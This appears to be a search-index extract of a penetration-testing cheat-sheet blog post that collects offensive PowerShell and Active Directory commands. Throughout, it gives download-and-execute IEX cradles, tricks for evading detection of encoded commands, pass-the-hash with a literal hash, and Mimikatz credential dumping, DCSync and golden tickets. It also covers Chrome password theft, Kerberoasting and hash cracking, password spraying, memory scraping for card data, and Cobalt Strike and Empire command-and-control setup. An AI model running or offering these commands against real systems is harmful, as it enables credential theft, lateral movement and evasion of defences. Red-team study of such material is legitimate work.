EXPRESSION = { $_.ConverttoDateTime ( $_.lastbootuptime ) }} Wrap binary execution in a powershell loop 1 powershell foreach ($ target in ( get-content c : \\ users \\ username \\ appdata \\ local \\ temp \\ hosts_da_loggedin_unique . txt )) { \" [ * ] $ Target : \" ; ( c : \\ programdata \\ sd . exe ./ administrator @ $ target - hashes aad3b435b51404eeaad3b435b51404ee : a4bab1c7d4bef62d4c22043ddbf1312c ) } ` Download a file 1 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true } ;(new-object system.net.webclient).downloadfile(\"https://www.mydomain.com/file\",\"C:\\Users\\username\\AppData\\Local\\Temp\\file.txt\") Encode string 1 echo \"iex (New-Object Net.WebClient).DownloadString('http://192.168.1.1:80/file')\" | iconv --to-code UTF-16LE | base64 -w 0 List recently modified files in path (U:) 1 Get - Childitem u : \\ - Recurse | where - object { ! ( $ _ . psiscontainer ) } | where { $ _ . LastWriteTime - gt $ ( Get - Date ). AddDays ( - 1 ) } | foreach { \"$($_.LastWriteTime) :: $($_.Fullname) \" } List Files 1 Select - String - Path c : \\ fso \\ * . txt , c : \\ fso \\ * . log - pattern ed List First 100 Files 1 Get - ChildItem - Path XXX | Select - First 100 Fullname List a Process's Loaded Modules (DLL) 1 get - process - id 1234 | select - expand modules Remote Command Execution using MMC 1 https : // enigma0x3 . net / 2017 / 01 / 05 / lateral - movement - using - the - mmc20 - application - com - object / Get LocalAccountTokenFilterPolicy (Determine if you can authenticate to admin resources over the network, i.e. C ,ADMIN ,ADMIN ) 1 Get - ItemProperty HKLM : \\ SOFTWARE \\ Microsoft \\ Windows \\ CurrentVersion \\ Policies \\ System \\ | Select LocalAccountTokenFilterPolicy | fl Test User Credentials 1 powerpick $ password = ConvertTo - SecureString \"PlainTextPassword\" - AsPlainText - Force ; $ cred = New - Object System . Management . Automation . PSCredential ( \"domain\\name\" , $ password ); Search for SSN https://technet.microsoft.com/en-us/library/2008.04.securitywatch.aspx 1 $ SSN_Regex = \" [0-9]{3}[-| ][0-9]{2}[-| ][0-9]{4}\" ; Get - ChildItem . - Recurse - exclude * . exe , * . dll | Select - String - Pattern $ SSN_Regex | Select - String - Pattern $ SSN_Regex | Select - Object Path , Filename , Matches | ft - auto | out - string - width 200 ; \"[*] SSN Search Complete!\" Enumerate the use of the Windows Server Update Services (WSUS) 1 2 3 4 5 6 7 Get - ItemProperty - Path Registry :: \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\" | Select - Object - ExpandProperty WUServer Get - ItemProperty - Path Registry :: \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\" | Select - Object - ExpandProperty WUStatusServer Get - ItemProperty - Path Registry :: \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" | Select - Object - ExpandProperty UseWUServer reg query HKEY_LOCAL_MACHINE \\ SOFTWARE \\ Policies \\ Microsoft \\ Windows \\ WindowsUpdate Get unquoted service paths 1 gwmi win32_service | Select pathname | Where { ( $ _ . pathname - ne $ null ) } | Where { - not $ _ . pathname . StartsWith ( \"`\"\")} | Where {($_.pathname.Substring(0, $_.pathname.IndexOf(\" . \") +4)) -match \" . * . * \"}","title":"Powershell"},{"location":"blogs/2019/penetration-testing-pasties/#find-files-custom","text":"1 Find - Files - searchBase \"i:\\\" - searchTerms \"*web.xml*,*web.config*,*password*,*tomcat-users.xml*\" - LogPath \"C:\\Users\\username\\AppData\\Local\\Temp\"","title":"Find-Files (custom)"},{"location":"blogs/2019/penetration-testing-pasties/#get-enumeration-custom","text":"Run Local and Domain enumeration functions on the local host. 1 Get - Enumeration - Path . - Local - Domain","title":"Get-Enumeration (custom)"},{"location":"blogs/2019/penetration-testing-pasties/#download-and-execute-iex","text":"1 powershell - nop - w hidden - c \"iex (New-Object Net.WebClient).DownloadString('http://192.168.1.1:80/file')\"","title":"Download and execute IEX"},{"location":"blogs/2019/penetration-testing-pasties/#encodedcommand-and-iex-detection-bypass","text":"Author: Dave Kennedy Source: https://www.trustedsec.com/blog/circumventing-encodedcommand-detection-powershell/ Avoid detection of -enc 1 powershell - window hidden - C \"set-variable -name \" C \" -value \" - \"; set-variable -name \" s \" -value \" e \"; set-variable -name \" q \" -value \" c \"; set-variable -name \" P \" -value ((get-variable C).value.toString()+(get-variable s).value.toString()+(get-variable q).value.toString()) ; powershell (get-variable P).value.toString() <b64encodedcommandhere>\" Avoid detection of IEX 1 powershell - window hidden - C \"set-variable -name \" LB \" -value \" I \"; set-variable -name \" I \" -value \" E \"; set-variable -name \" V \" -value \" X \"; set-variable -name \" wP \" -value ((get-variable LB).value.toString()+(get-variable I).value.toString()+(get-variable V).value.toString()) ; powershell (get-variable wP).value.toString() ('<YOURINVOKEEXPRESSIONSTUFFHERE>')\"","title":"EncodedCommand and IEX detection bypass"},{"location":"blogs/2019/penetration-testing-pasties/#bloodhound","text":"1 2 3 iex (( new-object system . net . webclient ) . downloadstring ( 'https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/PowerShell/BloodHound.ps1' )); Invoke-Bloodhound -CSVFolder c : \\ temp -CSVPrefix < prefix > Invoke-BloodHound -DomainController < domain IP > -Domain < FQDN > -CSVFolder C : \\ users \\ public \\ libraries -CSVPrefix < prefix > -CollectionMethod Stealth","title":"Bloodhound"},{"location":"blogs/2019/penetration-testing-pasties/#mimikittenz","text":"https://github.com/putterpanda/mimikittenz mimikittenz is a post-exploitation powershell tool that utilizes the Windows function ReadProcessMemory() in order to extract plain-text passwords from various target processes. mimikittenz can also easily extract other kinds of juicy info from target processes using regex patterns including but not limited to: TRACK2 (CreditCard) data from merchant/POS processes PII data Encryption Keys & All the other goodstuff Execution 1 Invoke - Mimikittenz Customizations 1 2 3 4 5 Custom regex - The syntax for adding custom regex is as follows : [ mimikittenz . MemProcInspector ]:: AddRegex ( \" <NameOfTarget> \" , \" <regex_here> \" ) Custom target process - Just append your target proccess name into the array : [ mimikittenz . MemProcInspector ]:: InspectManyProcs ( \" iexplore \" , \" chrome \" , \" firefox \" )","title":"Mimikittenz"},{"location":"blogs/2019/penetration-testing-pasties/#powerup","text":"Performs multiple local host privilege escalation checks for common Windows misconfigurations. 1 Invoke - AllChecks See cheat sheet for more commands","title":"PowerUp"},{"location":"blogs/2019/penetration-testing-pasties/#powerview","text":"Requires domain user privileges Find Administrative users logged in across the domain - default group = Domain Admins) 1 2 Invoke - UserHunter - Threads 15 - NoPing [ - GroupName \u201c Enterprise Admins \u201d ] Invoke - UserHunter - Threads 20 - GroupName \"Domain Admins\" - SearchForest - CheckAccess Find User (Stealthy via Fileshares) 1 Invoke - UserHunter - Stealth - Threads 5 - NoPing [ - GroupName \u201c Enterprise Admins \u201d ] [ - UserName \"svcAccount\" ] Get domain user info 1 2 3 Get - NetUser [ -UserName john ] Get - NetUser - Domain < domain > | Select - Object objectsid , lockouttime , samaccounttype , accountexpires , objectclass , useraccountcontrol , @{ Name = 'memberof' ; Expression = { [ string ]:: join ( \";\" ,( $ _ . memberof )) }} , info , distinguishedname , adspath , cn , pwdlastset , objectguid , whencreated , description , samaccountname , usnchanged , name | export - csv userprops_members . csv Find group names 1 Get - NetGroup [ - GroupName * admin * ] Get group members 1 Get - NetGroupMember [ - GroupName \u201c Domain Admins \u201d ] Find open shares - Noisy 1 Invoke - ShareFinder - CheckShareAccess Find open (non-default i.e. C$) shares by LDAP source 1 2 3 Invoke - ShareFinder - ComputerADSPath \"LDAP://OU=Servers,OU=IT,DC=domain,DC=com\" - CheckShareAccess - ExcludeStandard | Out - File - Encoding ascii c : \\ windows \\ temp \\ server_shares . txt Invoke - ShareFinder - ExcludePrint - ExcludeIPC - CheckShareAccess Find interesting files 1 powershell Invoke - FileFinder - ComputerName < hostname > - share share_list . txt - terms ssn , pass , sensitive , secret , admin , login , unattend * . xml , web . config , account - Threads 20 | export - csv filefinder_shares . csv Find hosts where the current user is local admin - Noisy 1 Find - LocalAdminAccess Get details of all domain computers and export to a CSV file for easy viewing 1 Get - computerproperty - Domain < domain . com > - properties displayname , adspath , lastlogontimestamp , operatingsystem , operatingsystemversion , @{ Name = 'memberof' ; Expression = { [ string ]:: join ( \";\" ,( $ _ . memberof )) }} | export - csv computerprops . csv Get Computers with Unconstrained Delegation 1 Get - NetComputer - Unconstrained | ft - a Get Users & Computers Trusted for Delegation 1 2 3 Get - DomainUser - TrustedtoAuth - Properties distinguisedname , useraccountcontrol , msds - allowedtodelegateto | fl Get - DomainComputer - TrustedtoAuth - Properties distinguisedname , useraccountcontrol , msds - allowedtodelegateto | fl","title":"PowerView"},{"location":"blogs/2019/penetration-testing-pasties/#net-functions","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 Get - NetDomain - gets the name of the current user ' s domain Get - NetForest - gets the forest associated with the current user ' s domain Get - NetForestDomain - gets all domains for the current forest Get - NetDomainController - gets the domain controllers for the current computer ' s domain Get - NetUser - returns all user objects , or the user specified ( wildcard specifiable ) Add - NetUser - adds a local or domain user Get - NetComputer - gets a list of all current servers in the domain Get - NetPrinter - gets an array of all current computers objects in a domain Get - NetOU - gets data for domain organization units Get - NetSite - gets current sites in a domain Get - NetSubnet - gets registered subnets for a domain Get - NetGroup - gets a list of all current groups in a domain Get - NetGroupMember - gets a list of all current users in a specified domain group Get - NetLocalGroup - gets the members of a localgroup on a remote host or hosts Add - NetGroupUser - adds a local or domain user to a local or domain group Get - NetFileServer - get a list of file servers used by current domain users Get - DFSshare - gets a list of all distribute file system shares on a domain Get - NetShare - gets share information for a specified server Get - NetLoggedon - gets users actively logged onto a specified server Get - NetSession - gets active sessions on a specified server Get - NetRDPSession - gets active RDP sessions for a specified server ( like qwinsta ) Get - NetProcess - gets the remote processes and owners on a remote server Get - UserEvent - returns logon or TGT events from the event log for a specified host Get - ADObject - takes a domain SID and returns the user , group , or computer object associated with it Set - ADObject - takes a SID , name , or SamAccountName to query for a specified domain object , and then sets a specified ' PropertyName ' to a specified ' PropertyValue '","title":"net * Functions:"},{"location":"blogs/2019/penetration-testing-pasties/#gpo-functions","text":"1 2 3 4 5 6 7 8 9 Get - GptTmpl - parses a GptTmpl . inf to a custom object Get - NetGPO - gets all current GPOs for a given domain Get - NetGPOGroup - gets all GPOs in a domain that set \" Restricted Groups \" on on target machines Find - GPOLocation - takes a user / group and makes machines they have effective rights over through GPO enumeration and correlation Find - GPOComputerAdmin - takes a computer and determines who has admin rights over it through GPO enumeration Get - DomainPolicy - returns the default domain or DC policy","title":"GPO functions"},{"location":"blogs/2019/penetration-testing-pasties/#user-hunting-functions","text":"1 2 3 4 Invoke - UserHunter - finds machines on the local domain where specified users are logged into , and can optionally check if the current user has local admin access to found machines Invoke - StealthUserHunter - finds all file servers utilizes in user HomeDirectories , and checks the sessions one each file server , hunting for particular users Invoke - ProcessHunter - hunts for processes with a specific name or owned by a specific user on domain machines Invoke - UserEventHunter - hunts for user logon events in domain controller event logs","title":"User-Hunting Functions:"},{"location":"blogs/2019/penetration-testing-pasties/#domain-trust-functions","text":"1 2 3 4 5 Get - NetDomainTrust - gets all trusts for the current user ' s domain Get - NetForestTrust - gets all trusts for the forest associated with the current user ' s domain Find - ForeignUser - enumerates users who are in groups outside of their principal domain Find - ForeignGroup - enumerates all the members of a domain ' s groups and finds users that are outside of the queried domain Invoke - MapDomainTrust - try to build a relational mapping of all domain trusts","title":"Domain Trust Functions:"},{"location":"blogs/2019/penetration-testing-pasties/#metafunctions","text":"1 2 3 4 5 6 7 Invoke - ShareFinder - finds ( non - standard ) shares on hosts in the local domain Invoke - FileFinder - finds potentially sensitive files on hosts in the local domain Find - LocalAdminAccess - finds machines on the domain that the current user has local admin access to Find - UserField - searches a user field for a particular term Find - ComputerField - searches a computer field for a particular term Get - ExploitableSystem - finds systems likely vulnerable to common exploits Invoke - EnumerateLocalAdmin - enumerates members of the local Administrators groups across all machines in the domain HarmJ0y PowerView Cheat Sheet PDF HarmJ0y's PowerView 2.0 Tricks Gist","title":"MetaFunctions:"},{"location":"blogs/2019/penetration-testing-pasties/#inveigh","text":"https://github.com/Kevin-Robertson/Inveigh Inveigh is a Windows PowerShell LLMNR/NBNS spoofer/man-in-the-middle tool designed to assist penetration testers that find themselves limited to a Windows system. The main Inveigh LLMNR/NBNS spoofer function. 1","title":"Inveigh"},{"location":"blogs/2019/penetration-testing-pasties/#privilege-requirements","text":"Elevated Administrator or SYSTEM","title":"Privilege Requirements:"},{"location":"blogs/2019/penetration-testing-pasties/#features","text":"IPv4 LLMNR/NBNS spoofer with granular control NTLMv1/NTLMv2 challenge/response capture over HTTP/HTTPS/SMB Basic auth cleartext credential capture over HTTP/HTTPS WPAD server capable of hosting a basic or custom wpad.dat file HTTP/HTTPS server capable of hosting limited content Granular control of console and file output Run time control","title":"Features:"},{"location":"blogs/2019/penetration-testing-pasties/#powershell-wout-powershell","text":"MsBuild.exe https://gist.githubusercontent.com/subTee/6b236083da2fd6ddff216e434f257614/raw/a224d1edd3453cc321c63aaeefd2b59ea00622a2/pshell.xml","title":"Powershell W/out Powershell"},{"location":"blogs/2019/penetration-testing-pasties/#get-indexeditem","text":"Gets files which have been indexed by Windows desktop search. Searches the Windows index on the local computer or a remote file serving computer looking for file properties or free text searching over contents Sources: https://gallery.technet.microsoft.com/scriptcenter/Get-IndexedItem-PowerShell-5bca2dae https://github.com/adaptivethreat/Empire/blob/master/data/module_source/collection/Get-IndexedItem.ps1","title":"Get-IndexedItem"},{"location":"blogs/2019/penetration-testing-pasties/#interacting-w-windows-api","text":"https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/25/use-powershell-to-interact-with-the-windows-api-part-1/","title":"Interacting w/ Windows API"},{"location":"blogs/2019/penetration-testing-pasties/#example-lock-workstation-and-messagebox","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 Add - Type - TypeDefinition @\" using System ; using System . Diagnostics ; using System . Runtime . InteropServices ; public static class User32 { [ DllImport ( \"user32.dll\" , CharSet = CharSet . Auto )] public static extern bool MessageBox ( IntPtr hWnd , /// Parent window handle String text , /// Text message to display String caption , /// Window caption int options ); /// MessageBox type [ DllImport ( \"user32.dll\" , CharSet = CharSet . Auto )] public static extern bool LockWorkStation (); } \"@ [ USER32 ] :: LockWorkStation () List static methods 1 [ USER32 ] | get - member - static","title":"Example - Lock Workstation and MessageBox"},{"location":"blogs/2019/penetration-testing-pasties/#mailsniper-owa-and-exchange-enumeration","text":"Source: https://github.com/dafthack/MailSniper MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). It can be used as a non-administrative user to search their own email, or by an Exchange administrator to search the mailboxes of every user in a domain. MailSniper also includes additional modules for password spraying, and gathering the Global Address List from OWA and EWS. Bypassing Dual Factor Authentication on OWA - http://www.blackhillsinfosec.com/?p=5396 It appears that Outlook portals that are being protected by two-factor authentication might not be covering all of the authentication protocols to Microsoft Exchange. Leverages the Exchange Web Services (EWS) feature of OWA. Just have to check for the presence of mail.org.com\\EWS\\Exchange.asmx Invoke - SelfSearch - Mailbox email @domain . com - ExchHostname mail . domain . com - Remote After the credentials have been entered MailSniper will attempt to connect to the EWS URL at https://mail.domain.com/EWS/Exchange.asmx and search the user\u2019s inbox for key terms (by default \u201c pass \u201d, \u201c creds \u201d, and \u201c credentials \u201d).","title":"MailSniper (OWA and Exchange Enumeration)"},{"location":"blogs/2019/penetration-testing-pasties/#locate-owa-instances-via-autodiscover-using-only-organization-primary-domain-name","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 < smtp-mail-domain >/ Autodiscover / Autodiscover . xml or autodiscover .< smtp-mail-domain >/ Autodiscover / Autodiscover . xml or dig _autodiscover . _tcp .< domain-name > SRV ; <<>> DiG 9 . 8 . 3-P1 <<>> _autodiscover . _tcp .< domain-name > . org SRV ;; global options : + cmd ;; Got answer : ;; - >> HEADER << - opcode : QUERY , status : NOERROR , id : 45003 ;; flags : qr rd ra ; QUERY : 1 , ANSWER : 1 , AUTHORITY : 0 , ADDITIONAL : 0 ;; QUESTION SECTION : ; _autodiscover . _tcp .< domain-name > . org . IN SRV ;; ANSWER SECTION : _autodiscover . _tcp .< domain-name > . org . 1720 IN SRV 0 0 443 webmail .< domain-name > . org . ;; Query time : 2 msec ;; SERVER : 192 . 168 . 178 . 1 # 53 ( 192 . 168 . 178 . 1 ) ;; WHEN : Thu Dec 1 10 : 40 : 33 2016 ;; MSG SIZE rcvd : 83","title":"Locate OWA instances via Autodiscover using only organization primary domain name"},{"location":"blogs/2019/penetration-testing-pasties/#domainpasswordspray-internal-windows-domain-password-brute-forcing","text":"Source: https://github.com/dafthack/DomainPasswordSpray DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS!","title":"DomainPasswordSpray (Internal Windows Domain Password Brute Forcing)"},{"location":"blogs/2019/penetration-testing-pasties/#quick-start-guide","text":"Open a PowerShell terminal from the Windows command line with 'powershell.exe -exec bypass'. 1 Type 'Import-Module Invoke-DomainPasswordSpray.ps1' . The only option necessary to perform a password spray is either -Password for a single password or -PasswordList to attempt multiple sprays. When using the -PasswordList option Invoke-DomainPasswordSpray will attempt to gather the account lockout observation window from the domain and limit sprays to one per observation window to avoid locking out accounts. The following command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2016. 1 PowerShell Invoke - DomainPasswordSpray - Password Winter2016 The following command will use the userlist at users.txt and try to authenticate to the domain \"domain-name\" using each password in the passlist.txt file one at a time. It will automatically attempt to detect the domain's lockout observation window and restrict sprays to one attempt during each window. The results of the spray will be output to a file called sprayed-creds.txt 1 PowerShell Invoke - DomainPasswordSpray - UserList users . txt - Domain domain - name - PasswordList passlist . txt - OutFile sprayed - creds . txt","title":"Quick Start Guide"},{"location":"blogs/2019/penetration-testing-pasties/#invoke-domainpasswordspray-options","text":"1 2 3 4 5 UserList - Optional UserList parameter . This will be generated automatically if not specified . Password - A single password that will be used to perform the password spray . PasswordList - A list of passwords one per line to use for the password spray ( Be very careful not to lockout accounts ) . OutFile - A file to output the results to . Domain - A domain to spray against .","title":"Invoke-DomainPasswordSpray Options"},{"location":"blogs/2019/penetration-testing-pasties/#misc-powershell-pasties","text":"List Removeable Drives 1 Get - WmiObject Win32_LogicalDisk | Where - Object { ( $ _ . DriveType - eq 2 ) - and ( $ _ . DeviceID - ne 'A:' ) } | % { \"USB_PROCESS_DETECTED: \" + $ _ . ProviderName + \"`n\" } Random Execution Method 1 2 3 $ visio = [ activator ]:: CreateInstance ( [ type ]:: GetTypeFromProgID ( \" visio.application \" , \" system1 \" )) $d ocs = $ visio . Documents . Add ( \"\" ) $d ocs . ExecuteLine ( ' CreateObject(\"Wscript.Shell\").Exec(\"cmd.exe\") ' )","title":"Misc Powershell Pasties"},{"location":"blogs/2019/penetration-testing-pasties/#mimikatz","text":"https://github.com/gentilkiwi/mimikatz/wiki https://adsecurity.org/?p=2362 Dump Cleartext Credentials 1 2 3 sekurlsa :: wdigest sekurlsa :: logonpasswords lsadump :: secrets Dump cached domain credentials 1 lsadump :: cache Format mscachev2 as $ DCC2$10240 # username # hash 1 cat 'mscachecreds.txt' | awk - F \u201c : \u201d { 'print \"$DCC2$10240#\"$1\"#\"$2' } Crack mscachev2 format with Hashcat (extremely slow) 1 . / hashcat - m 2100 - a 0 mscachev2 . dump . / wordlists /* -r rules/dive.rule DCSYNC - Remote Hash Dumping from a Domain Controller 1 mimikatz lsadump :: dcsync / user : domain \\ krbtgt There is also a CS built-in function for this Source: http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/ Pass the Hash 1 mimikatz sekurlsa :: pth / user : localadmin / domain :. / ntlm : 21306681 c738c3ed2d615e29be1574a3 / run : powershell - w hidden Golden Ticket Creation (File) 1 mimikatz kerberos :: golden / user : newadmin / domain : domain . com / sid : S - 1 - 5 - 21 - 3683589091 - 3492174527 - 1688384936 / groups : 501 , 502 , 513 , 512 , 520 , 518 , 519 / krbtgt : < krbtgthash > / ticket : newadmin . tkt Golden Ticket Creation (Pass-The-Ticket) - Create the ticket for your current session 1 mimikatz kerberos :: golden / user : newadmin / domain : domain . com / sid : S - 1 - 5 - 21 - 3683589091 - 3492174527 - 1688384936 / krbtgt : < krbtgthash > / ptt To create a Golden ticket to own the parent domain, once a child domain controller is compromised you will need the following pieces: 1 2 3 4 5 6 7 8 / user : ChildDomainControllerMachineName$ \u2002\u2002 / rc4 : KRBTGT Hash / sid : Child Domain SID / domain : FQDN of Child Domain / groups : 516 / sids : ParentSID - 516 , S - 1 - 5 - 9 / id : ID of Child Domain Controller / ptt Dump Google Chrome passwords 1 2 3 4 5 shell copy \"C:\\users\\kobrien\\appdata\\local\\google\\chrome\\user data\\default\\Login Data\" C : \\ users \\ public \\ libraries \\ ld . dat steal_token < user pid > mimikatz @dpapi :: chrome / in : C : \\ users \\ public \\ libraries \\ ld . dat / unprotect Detecting Golden Ticket use on a DC 1 2 3 4 5 6 7 8 9 10 11 12 13 <QueryList> \u2002\u2002 <Query Id= \"0\" Path= \"Security\" > \u2002\u2002\u2002\u2002 <Select Path= \"Security\" > \u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002*[System[EventID='4768']] \u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002and \u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002*[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']] \u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002and \u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002*[EventData[Data[@Name='ServiceName'] = 'krbtgt']] \u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002and \u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002*[EventData[Data[@Name='TicketEncryptionType'] = '0x17']] \u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002 </Select> \u2002\u2002 </Query> </QueryList>","title":"Mimikatz"},{"location":"blogs/2019/penetration-testing-pasties/#kerberoast","text":"https://github.com/nidem/kerberoast https://room362.com/post/2016/kerberoast-pt1/ https://room362.com/post/2016/kerberoast-pt2/ https://room362.com/post/2016/kerberoast-pt3/ 1 Add - Type - AssemblyName System . IdentityModel ; New - Object System . IdentityModel . Tokens . KerberosRequestorSecurityToken - ArgumentList \"MSSQLSvc/host.domain.com\" Use mimikatz to export SPN Tikets once requested (Generates one file per ticket unless base64 option is used) 1 2 mimkatz kerberos :: list / export Invoke - Mimikatz - Command ' standard::base64 \"kerberos::list /export\" exit ' Impacket method of extracting SPN tickets and output hashes in the correct format for John via Proxychains and Beacon (Preferred) 1 proxychains python . / GetUserSPNs . py - request domain . com / domainuser : password - dc - ip < domain controller IP > - outputfile < out . dump > Cracking the hashes 1 2 3 . / hashcat - m 13100 - a 0 spns . dump . / wordlists /* -r rules/dive.rule ./john --format=krb5tgs spns.dump --wordlist=","title":"Kerberoast"},{"location":"blogs/2019/penetration-testing-pasties/#domain-admin-privesc-methods","text":"https://adsecurity.org/?p=2362 Passwords in SYSVOL & Group Policy Preferences 1 findstr / S cpassword % logonserver % \\ sysvol \\ * . xml or use Get-GPPPasswords.ps1 from PowerSploit Exploit the MS14-068 Kerberos Vulnerability on a Domain Controller Missing the Patch Kerberos TGS Service Ticket Offline Cracking (Kerberoast) The Credential Theft Shuffle Gain access to AD Database file (ntds.dit) Backup locations (backup server storage, media, and/or network shares) Find the NTDS.dit file staged on member servers prior to promoting to Domain Controllers. With admin rights to virtualization host, a virtual DC can be cloned and the associated data copied offline.","title":"Domain Admin Privesc Methods"},{"location":"blogs/2019/penetration-testing-pasties/#command-and-control","text":"Simple TCP Port Redirection 1 2 socat TCP - LISTEN : 80 , fork TCP : < remote host > : 80 socat TCP - LISTEN : 443 , fork TCP : < remote host > : 443 UDP Port Redirection 1 socat udp4-recvfrom : 53 , reuseaddr , fork udp4-sendto :< IPADDRESS >; echo -ne Simple HTTP Redirect Save as a file like the following as redirect.html and map to root \"/\" on your Team Server. Casual browsing to the root of your domain will then simply redirect. 1 2 3 4 <html> <title> Google </title> <meta http-equiv= \"refresh\" content= \"0;url=https://www.googlrrrr.com\" /> </html>","title":"Command and Control"},{"location":"blogs/2019/penetration-testing-pasties/#domain-fronting","text":"https://github.com/rvrsh3ll/FindFrontableDomains","title":"Domain Fronting"},{"location":"blogs/2019/penetration-testing-pasties/#cobalt-strike","text":"http://blog.cobaltstrike.com/2016/07/06/gettin-down-with-aggressor-script/ https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/DA-Watch.cna https://github.com/Und3rf10w/Aggressor-scripts 1 portscan 10 . 42 . 175 . 0 / 26 21 , 22 , 23 , 25 , 80 , 443 , 445 , 1433 , 3389 , 8080 , 8443 Start Remote Beacon DLL via iwmi 1 powerpick iwmi - class Win32_Process - name create - ArgumentList \"rundll32.exe c:\\users\\public\\libraries\\smb_beacon.dll.log0,StartW\"","title":"Cobalt Strike"},{"location":"blogs/2019/penetration-testing-pasties/#opsec-considerations-for-beacon-commands","text":"Blog.Cobaltstrike.com - OPSEC Considerations For Beacon Commands A good operator knows their tools and has an idea of how the tool is accomplishing its objectives on their behalf. This blog post surveys Beacons commands and provides background on which commands inject into remote processes, which commands spawn jobs, and which commands rely on cmd.exe or powershell.exe. API-only These commands are built-into Beacon and rely on Win32 APIs to meet their objectives. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 cd cp download drives exit getuid kerberos_ccache_use kerberos_ticket_purge kerberos_ticket_use jobkill kill link ls make_token mkdir mv ppid ps pwd rev2self rm rportfwd socks steal_token timestomp unlink upload House-keeping Commands The following commands are built into Beacon and exist to configure Beacon or perform house-keeping actions. Some of these commands (e.g., clear, downloads, help, mode, note) do not generate a task for Beacon to execute. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 cancel checkin clear downloads help jobs mode dns mode dns - txt mode dns6 mode http note powershell - import sleep socks stop spawnto Post-Exploitation Jobs (Process Execution + Remote Process Injection) Many Beacon post-exploitation features spawn a process and inject a capability into that process. Beacon does this for a number of reasons: (i) this protects the agent if the capability crashes, (ii) this scheme makes it seamless for an x86 Beacon to launch x64 post-exploitation tasks. The following commands run as post-exploitation jobs: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 browserpivot bypassuac covertvpn dcsync desktop elevate hashdump keylogger logonpasswords mimikatz net portscan powerpick psinject pth screenshot shspawn spawn ssh ssh - key wdigest OPSEC Advice: Use the spawnto command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe (you probably don\u2019t want that). The ppid command will change the parent process these jobs are run under as well. Process Execution These commands spawn a new process: 1 2 3 execute runas runu OPSEC Advice: The ppid command will change the parent process of commands run by execute. The ppid command does not affect runas or spawnu. Process Execution: Cmd.exe The shell command depends on cmd.exe. The pth and getsystem commands get honorable mention here. These commands rely on cmd.exe to pass a token to Beacon via a named pipe. OPSEC Advice: the shell command uses the COMSPEC environment variable to find the preferred command-line interpreter on Windows. Use Aggressor Script\u2019s &bsetenv function to point COMSPEC to a different cmd.exe location, if needed. Use the ppid command to change the parent process the command-line interpreter is run under. To pth without cmd.exe, execute the pth steps by hand. Process Execution: PowerShell.exe The following commands launch powershell.exe to perform some task on your behalf. 1 2 3 4 5 powershell spawnas spawnu winrm wmi OPSEC Advice: Use the ppid command to change the parent process powershell.exe is run under. Be aware, there are alternatives to each of these commands that do not use powershell.exe: 1 2 3 spawnu has runu which runs an arbitrary command under another process . spawnas has runas which runs an arbitrary command as another user . powershell has powerpick , this command runs powershell scripts without powershell . exe . It\u2019s also possible to laterally spread without the winrm and wmi commands. Remote Process Injection The post-exploitation job commands (previously mentioned) rely on process injection too. The other commands that inject into a remote process are: 1 2 3 dllinject inject shinject Service Creation The following internal Beacon commands create a service (either on the current host or a remote target) to run a command. These commands use Win32 APIs to create and manipulate services. 1 2 3 getsystem psexec psexec_psh","title":"OPSEC Considerations for Beacon Commands"},{"location":"blogs/2019/penetration-testing-pasties/#powershell-function-wrapper","text":"https://github.com/bluscreenofjeff/AggressorScripts/blob/master/powershell.cna https://bluescreenofjeff.com/2016-09-07-adding-easy-guis-to-aggressor-scripts/","title":"Powershell Function Wrapper"},{"location":"blogs/2019/penetration-testing-pasties/#persistence-scripts","text":"https://github.com/ZonkSec/persistence-aggressor-script https://github.com/ZonkSec/persistence-aggressor-script/blob/master/persistence.cna","title":"Persistence Scripts"},{"location":"blogs/2019/penetration-testing-pasties/#empire","text":"Cheat sheets 1 2 - https : // github . com / adaptivethreat / Empire / wiki / Quickstart - https : // attackerkb . com / Powershell / Powershell_Empire Clone GIT Repo 1 2 root @workstation : ~ # git clone https : // github . com / adaptivethreat / Empire . git empire Cloning into 'empire' ... Install Empire 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 root @ workstation : ~ # cd empire / root @ workstation : ~/ empire # cd setup / root @ workstation : ~/ empire / setup # . / install . sh Reading package lists ... Done Building dependency tree Reading state information ... Done ... Successfully installed pydispatcher Cleaning up ... [ > ] Enter server negotiation password , enter for random generation : [ * ] Database setup completed ! root @ workstation : ~/ empire / setup # Start Empire 1 2 root @workstation : ~/ empire / setup # cd .. root @workstation : ~/ empire # . / empire Start with REST API for use with Empire Web 1 2 3 . / empire --headless --username admin --password <PASSWORD> --restport 1337 . / empire --rest --username admin --password <PASSWORD> --restport 1337","title":"EMPIRE"},{"location":"blogs/2019/penetration-testing-pasties/#c2-profiles","text":"Edit default client settings in / setup / setup_database . 